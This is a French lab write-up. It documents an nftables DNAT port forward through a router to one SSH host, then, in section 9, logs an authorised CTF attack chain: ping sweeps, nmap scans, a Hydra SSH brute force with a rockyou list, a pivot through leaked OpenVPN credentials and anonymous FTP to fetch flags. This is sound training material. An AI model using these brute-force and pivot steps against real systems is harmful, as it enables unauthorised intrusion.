# Test depuis un PC d'un autre apprenant

## Objectif

Cette feuille documente le test réalisé depuis un poste extérieur au lab direct, par exemple le PC d'un autre apprenant dans la salle.

L'objectif est de vérifier qu'un accès publié sur `R2` permet d'atteindre uniquement le service prévu sur `RH1`, sans ouvrir largement le réseau interne.

Le test reste limité au périmètre autorisé :

```text
PC autre apprenant -> R2:2222 -> RH1:22
```

## Contexte réseau

| Élément | Adresse / rôle |
| --- | --- |
| PC autre apprenant | Poste de test externe |
| R2 côté NAT | `192.168.122.218` |
| pfSense côté transit | `192.168.100.1` ou interface `TO_R2` selon la maquette |
| RH1 | `192.168.30.101` |
| Service publié | SSH de RH1 |
| Port publié sur R2 | `2222/tcp` |
| Port réel sur RH1 | `22/tcp` |

## Principe du test

Le PC externe ne contacte pas directement `RH1`. Il contacte `R2` sur le port `2222`.

`R2` réalise ensuite :

- une redirection DNAT de `R2:2222` vers `RH1:22` ;
- un masquerade vers `RH1` pour simplifier le retour ;
- une autorisation `forward` pour laisser passer le flux redirigé.

Schéma logique :

```text
PC autre apprenant
        |
        | ssh vers 192.168.122.218:2222
        v
R2
        |
        | DNAT vers 192.168.30.101:22
        v
pfSense / réseau RH
        |
        v
RH1
```

## 1. Vérifier la route vers RH1 depuis R2

Sur `R2` :

```bash
ip route get 192.168.30.101
```

Résultat attendu :

```text
192.168.30.101 via 192.168.100.1 dev ens3 src 192.168.100.2
```

Tester le port SSH de RH1 depuis `R2` :

```bash
nc -zv 192.168.30.101 22
```

Si ce test échoue, vérifier :

- les règles pfSense sur l'interface `TO_R2` ;
- l'état du service SSH sur `RH1` ;
- la route de `R2` vers le VLAN RH.

## 2. Activer le routage IPv4 sur R2

Activation immédiate :

```bash
sudo sysctl -w net.ipv4.ip_forward=1
```

Vérification :

```bash
sysctl net.ipv4.ip_forward
```

Résultat attendu :

```text
net.ipv4.ip_forward = 1
```

Pour rendre le réglage persistant :

```bash
sudo nano /etc/sysctl.conf
```

Ajouter ou décommenter :

```text
net.ipv4.ip_forward=1
```

Appliquer :

```bash
sudo sysctl -p
```

## 3. Ajouter la redirection NAT sur R2

Créer la table NAT si nécessaire :

```bash
sudo nft add table ip nat
```

Créer les chaînes NAT si nécessaire :

```bash
sudo nft add chain ip nat prerouting '{ type nat hook prerouting priority dstnat; policy accept; }'
sudo nft add chain ip nat postrouting '{ type nat hook postrouting priority srcnat; policy accept; }'
```

Ajouter la redirection de port :

```bash
sudo nft add rule ip nat prerouting tcp dport 2222 dnat to 192.168.30.101:22
```

Ajouter le masquerade vers RH1 :

```bash
sudo nft add rule ip nat postrouting ip daddr 192.168.30.101 masquerade
```

Vérifier :

```bash
sudo nft list ruleset
```

La table NAT doit contenir une règle de ce type :

```text
tcp dport 2222 dnat to 192.168.30.101:22
ip daddr 192.168.30.101 masquerade
```

## 4. Autoriser le forward dans nftables

Si `R2` a une chaîne `forward` avec une politique `drop`, le DNAT seul ne suffit pas.

Ajouter une règle d'autorisation :

```bash
sudo nft add rule inet filter forward iifname "ens4" ip daddr 192.168.30.101 tcp dport 22 accept
```

Les retours sont normalement couverts par :

```text
ct state established,related accept
```

Vérifier les règles :

```bash
sudo nft list ruleset
```

## 5. Autoriser le flux dans pfSense

Dans pfSense, sur l'interface `TO_R2`, ajouter ou vérifier une règle :

| Champ | Valeur |
| --- | --- |
| Action | Pass |
| Interface | `TO_R2` |
| Protocol | TCP |
| Source | R2 address ou `TO_R2 net` |
| Destination | `RH1 address` |
| Destination port | `22 (SSH)` |
| Description | `R2 NAT SSH vers RH1` |

Cette règle est nécessaire car pfSense filtre le passage entre `R2` et le VLAN RH.

## 6. Tester depuis le PC autre apprenant

Depuis le PC externe :

```bash
ssh debian@192.168.122.218 -p 2222
```

Résultat attendu :

```text
Connexion SSH vers RH1
```

Si la connexion reste bloquée, observer depuis `R2`.

## 7. Observer avec tcpdump

Sur `R2`, vérifier que les paquets arrivent bien sur le port publié :

```bash
sudo tcpdump -ni ens4 tcp port 2222
```

Relancer depuis le PC externe :

```bash
ssh debian@192.168.122.218 -p 2222
```

Exemple de paquets attendus :

```text
IP 192.168.122.1.xxxxx > 192.168.122.218.2222: Flags [S]
```

Observer toute la chaîne :

```bash
sudo tcpdump -ni any tcp port 2222 or host 192.168.30.101
```

On doit pouvoir observer :

```text
ens4 In  ... -> 192.168.122.218.2222
ens3 Out ... -> 192.168.30.101.22
```

## 8. Diagnostic rapide

| Symptôme | Cause probable | Vérification |
| --- | --- | --- |
| Timeout depuis le PC externe | R2 reçoit mais ne transfère pas | `sudo tcpdump -ni ens4 tcp port 2222` |
| Paquets visibles sur `ens4`, rien vers RH1 | Règle `forward` absente sur R2 | `sudo nft list ruleset` |
| Flux sort de R2 mais RH1 ne répond pas | pfSense bloque ou SSH RH1 absent | Logs pfSense, `nc -zv 192.168.30.101 22` |
| `No route to host` | Route vers RH1 incorrecte | `ip route get 192.168.30.101` |
| Connexion refusée | RH1 répond mais SSH n'écoute pas | `sudo ss -tulnp` sur RH1 |

## 9. Journal des commandes d'attaque CTF

Cette partie documente les commandes utilisées depuis le poste d'un autre apprenant dans le cadre du CTF autorisé.

Périmètre donné :

```text
ssh visiteur@172.22.114.125 -p 2222
mot de passe : visiteur
```

Objectifs annoncés :

- trouver un flag dans le VLAN Visiteur ;
- trouver un flag caché dans un autre VLAN ;
- exploiter des mots de passe faibles ;
- vérifier des configurations par défaut ;
- chercher des fichiers avec `find`.

### Connexion initiale

Depuis le poste local :

```bash
ssh visiteur@172.22.114.125 -p 2222
```

Identifiants fournis :

```text
Utilisateur : visiteur
Mot de passe : visiteur
```

### Reconnaissance locale

Après connexion :

```bash
whoami
hostname
ip -br addr
ip route
ls -la
```

Résultats importants observés :

```text
Utilisateur : visiteur
Nom machine : kali
Interface active : eth1
Adresse : 192.168.10.70/27
Passerelle : 192.168.10.65
Réseau local : 192.168.10.64/27
```

Fichiers visibles dans le home :

```bash
ls -la /home/visiteur
```

Fichiers intéressants repérés :

```text
pensebete.txt
yersinia.log
.bash_history
```

Lecture des fichiers :

```bash
cat pensebete.txt
cat yersinia.log
cat .bash_history
```

Indice trouvé dans `pensebete.txt` :

```text
admin
rockyou#26
```

Interprétation :

```text
Utilisateur probable : admin
Source du mot de passe : wordlist rockyou
Position probable dans la wordlist : ligne 26
```

### Recherche locale de flags et fichiers utiles

Recherche large par nom :

```bash
find / -iname '*flag*' 2>/dev/null
```

Cette commande peut produire beaucoup de bruit système. Pour une recherche plus utile :

```bash
find /home /tmp /var/tmp -type f 2>/dev/null
find /home /tmp /var/tmp -iname '*flag*' 2>/dev/null
grep -RniE 'flag|ctf|password|pass|indice|mdp' /home /tmp /var/tmp 2>/dev/null
```

Recherche d'utilisateurs locaux :

```bash
cat /etc/passwd | grep -E '/bin/(bash|sh|zsh)'
ls -la /home
```

Résultats observés :

```text
root
postgres
kali
visiteur
```

### Reconnaissance réseau du VLAN Visiteur

Afficher les voisins déjà connus :

```bash
ip neigh
```

Résultats observés :

```text
192.168.10.67
192.168.10.65
```

Tester la passerelle :

```bash
ping -c 1 192.168.10.65
```

Balayage ICMP limité au réseau autorisé :

```bash
for i in $(seq 65 94); do ping -c 1 -W 1 192.168.10.$i >/dev/null && echo "UP 192.168.10.$i"; done
```

Résultats observés :

```text
UP 192.168.10.67
UP 192.168.10.70
```

### Scan de services

Scan ciblé des ports utiles sur le VLAN Visiteur :

```bash
nmap -sV -p 21,22,80,443,445,8080 192.168.10.64/27
```

Résultats importants :

```text
192.168.10.65 : ports filtrés
192.168.10.67 : SSH ouvert, OpenSSH Debian
192.168.10.70 : machine locale, SSH ouvert
```

Recherche FTP anonyme :

```bash
nmap -p 21 --open 192.168.10.64/27
```

Si un FTP ouvert est trouvé, tester les identifiants par défaut :

```bash
ftp <IP>
```

Identifiants à tester selon l'indice donné :

```text
anonymous
anonymous
```

Commandes utiles dans FTP :

```text
ls
pwd
cd <dossier>
get <fichier>
bye
```

Source de l'indice :

```text
Configurations par défaut FTP : anonymous / anonymous
```

### Exploitation du mot de passe faible

Indice utilisé :

```text
admin
rockyou#26
```

Source de la wordlist :

```text
rockyou.txt
Chemin Kali courant : /usr/share/wordlists/rockyou.txt.gz
```

Afficher la ligne 26 de `rockyou` :

```bash
zcat /usr/share/wordlists/rockyou.txt.gz | sed -n '26p'
```

Si la wordlist est déjà décompressée :

```bash
sed -n '26p' /usr/share/wordlists/rockyou.txt
```

Créer une petite wordlist de test limitée aux premières lignes :

```bash
zcat /usr/share/wordlists/rockyou.txt.gz | head -30 > /tmp/rockyou-top30.txt
```

Tester SSH avec l'utilisateur trouvé :

```bash
ssh admin@192.168.10.67
```

Test contrôlé avec Hydra sur le seul hôte du CTF :

```bash
hydra -l admin -P /tmp/rockyou-top30.txt ssh://192.168.10.67
```

Important : le brute force doit rester limité au périmètre du CTF et à une liste courte pour ne pas dégrader la machine.

### Actions après connexion sur la machine cible

Après connexion en `admin` sur `192.168.10.67` :

```bash
whoami
hostname
ip -br addr
ip route
ls -la
```

Recherche du premier flag :

```bash
find /home /tmp /var/tmp -type f 2>/dev/null
find / -iname '*flag*' 2>/dev/null
grep -RniE 'flag|ctf' /home /tmp /var/tmp 2>/dev/null
```

Lecture du premier flag :

```bash
cat flag.txt
```

Résultat observé :

```text
FLAG{madeleine}
Bravo, tu as trouvé le premier flag

un deuxième flag existe sur une autre vlan de ce réseau
mais comment y accéder...

ps : si on galère à "trouver", il faut "find" !
```

Recherche d'un accès vers un autre VLAN :

```bash
ip route
ip neigh
```

Recherche des fichiers utiles avec `find` :

```bash
find /home /tmp /var/tmp -type f 2>/dev/null
find / -iname '*flag*' 2>/dev/null
grep -RniE 'flag|ctf|vlan|pass|password|ftp|anonymous|indice|mdp' /home /tmp /var/tmp 2>/dev/null
```

Fichiers importants trouvés :

```text
/home/vpn_vers_vlan10_flagfinal/client.ovpn
/home/vpn_vers_vlan10_flagfinal/id_pour_flag.txt
```

Lire les identifiants VPN :

```bash
cat /home/vpn_vers_vlan10_flagfinal/id_pour_flag.txt
```

Résultat observé :

```text
vpnuser
vpnuser
```

Lire le début de la configuration VPN :

```bash
sed -n '1,120p' /home/vpn_vers_vlan10_flagfinal/client.ovpn
```

Éléments importants :

```text
remote 192.168.10.65 1194 udp4
verify-x509-name "CTF-OpenVPN-Server" name
auth-user-pass
```

Monter le VPN :

```bash
sudo openvpn --config /home/vpn_vers_vlan10_flagfinal/client.ovpn
```

Identifiants saisis :

```text
Auth Username: vpnuser
Auth Password: vpnuser
```

Résultat attendu :

```text
TUN/TAP device tun0 opened
net_addr_v4_add: 172.16.88.2/24 dev tun0
Initialization Sequence Completed
```

Vérifier les routes après connexion VPN :

```bash
ip -br addr
ip route
```

Résultats importants observés :

```text
tun0             UNKNOWN        172.16.88.2/24
172.16.88.0/24 dev tun0
192.168.10.0/26 via 172.16.88.1 dev tun0
```

Le réseau à explorer pour le second flag est donc :

```text
192.168.10.0/26
```

Scan de découverte limité aux VLANs du CTF si autorisé :

```bash
nmap -sn 192.168.20.0/24
nmap -sn 192.168.30.0/24
```

Dans ce CTF, la route VPN indique plutôt de scanner :

```bash
nmap -sn 192.168.10.0/26
```

Résultats observés :

```text
192.168.10.1
192.168.10.3
192.168.10.10
```

Scan des ports utiles :

```bash
nmap -sV -p 21,22,80,443,445,8080 192.168.10.0/26
```

Résultats importants :

```text
192.168.10.1  : HTTP nginx sur 80
192.168.10.10 : FTP vsftpd 3.0.5 sur 21
```

Recherche de FTP dans les autres VLANs :

```bash
nmap -p 21 --open 192.168.20.0/24 192.168.30.0/24
```

Dans ce CTF, recherche FTP sur le réseau VPN :

```bash
nmap -p 21 --open 192.168.10.0/26
```

Si un FTP est trouvé :

```bash
ftp <IP>
```

Identifiants par défaut à tester :

```text
anonymous
anonymous
```

Connexion FTP réalisée :

```bash
ftp 192.168.10.10
```

Identifiants utilisés :

```text
anonymous
anonymous
```

Commandes FTP :

```text
pwd
ls
ls -la
get flagfinal.txt
bye
```

Résultat observé :

```text
flagfinal.txt
```

Lire le fichier récupéré :

```bash
cat flagfinal.txt
```

Résultat observé :

```text
SYNT{znqryrvarpelcgrr}
```

Le flag est chiffré en ROT13. Décodage :

```bash
echo 'SYNT{znqryrvarpelcgrr}' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

Résultat final :

```text
FLAG{madeleinecryptee}
```

### Chaîne d'attaque complète

```text
1. SSH visiteur sur 172.22.114.125:2222
2. Lecture de pensebete.txt
3. Indice admin + rockyou#26
4. SSH admin sur 192.168.10.67
5. Lecture flag.txt -> FLAG{madeleine}
6. find -> client.ovpn + id_pour_flag.txt
7. OpenVPN avec vpnuser/vpnuser
8. Route vers 192.168.10.0/26
9. Nmap -> FTP sur 192.168.10.10
10. FTP anonymous/anonymous
11. get flagfinal.txt
12. ROT13 -> FLAG{madeleinecryptee}
```

### Tableau récapitulatif des attaques/tests

| Étape | Source | Cible | Commande | Objectif |
| --- | --- | --- | --- | --- |
| Connexion initiale | PC local | `172.22.114.125:2222` | `ssh visiteur@172.22.114.125 -p 2222` | Entrer dans le CTF |
| Reconnaissance locale | `visiteur` | Machine Kali | `ip -br addr`, `ip route`, `ls -la` | Identifier réseau et fichiers |
| Lecture indice | `visiteur` | Home | `cat pensebete.txt` | Trouver user et source mot de passe |
| Recherche fichiers | `visiteur` | Système local | `find`, `grep` | Chercher flags/indices |
| Découverte réseau | `visiteur` | `192.168.10.64/27` | boucle `ping` | Identifier hôtes actifs |
| Scan services | `visiteur` | VLAN Visiteur | `nmap -sV -p 21,22,80,443,445,8080` | Repérer services exposés |
| Mot de passe faible | `visiteur` | Wordlist locale | `zcat ... | sed -n '26p'` | Extraire `rockyou#26` |
| Brute force limité | `visiteur` | `192.168.10.67:22` | `hydra -l admin -P /tmp/rockyou-top30.txt ssh://192.168.10.67` | Valider mot de passe faible |
| Connexion cible | `visiteur` | `192.168.10.67` | `ssh admin@192.168.10.67` | Passer sur l'hôte cible |
| Recherche flag | `admin` | Machine cible | `find`, `grep` | Trouver le flag local |
| Premier flag | `admin` | `/home/admin/flag.txt` | `cat flag.txt` | Lire `FLAG{madeleine}` |
| Recherche VPN | `admin` | `/home` | `find /home /tmp /var/tmp -type f` | Trouver `client.ovpn` et `id_pour_flag.txt` |
| Connexion VPN | `admin` | `192.168.10.65:1194` | `sudo openvpn --config client.ovpn` | Accéder au réseau du flag final |
| Reconnaissance VPN | `admin` | `192.168.10.0/26` | `nmap -sn`, `nmap -sV` | Identifier les hôtes et services |
| FTP anonymous | `admin` | `192.168.10.10:21` | `ftp 192.168.10.10` | Récupérer `flagfinal.txt` |
| Décodage | `admin` | `flagfinal.txt` | `tr 'A-Za-z' 'N-ZA-Mn-za-m'` | Décoder ROT13 en `FLAG{madeleinecryptee}` |

## 10. Nettoyage ou retour arrière

Afficher les règles avec leurs handles :

```bash
sudo nft -a list ruleset
```

Supprimer une règle si nécessaire :

```bash
sudo nft delete rule ip nat prerouting handle <HANDLE>
sudo nft delete rule ip nat postrouting handle <HANDLE>
sudo nft delete rule inet filter forward handle <HANDLE>
```

## 11. Points de sécurité

- Ne publier qu'un port précis, ici `2222/tcp` vers `RH1:22`.
- Ne pas faire de redirection large vers tout le VLAN RH.
- Garder une règle pfSense restrictive sur `TO_R2`.
- Observer les connexions pendant le test avec `tcpdump`.
- Supprimer ou désactiver la publication après le test si elle n'est plus nécessaire.

## Conclusion

Le test depuis un PC d'un autre apprenant valide une exposition contrôlée : l'accès externe ne donne pas un accès direct au VLAN RH, mais uniquement au service SSH de `RH1` publié via `R2`.

La publication fonctionne uniquement si quatre éléments sont alignés :

1. routage IPv4 activé sur `R2` ;
2. règle DNAT sur `R2` ;
3. règle `forward` sur `R2` ;
4. règle pfSense autorisant `R2` vers `RH1:22`.
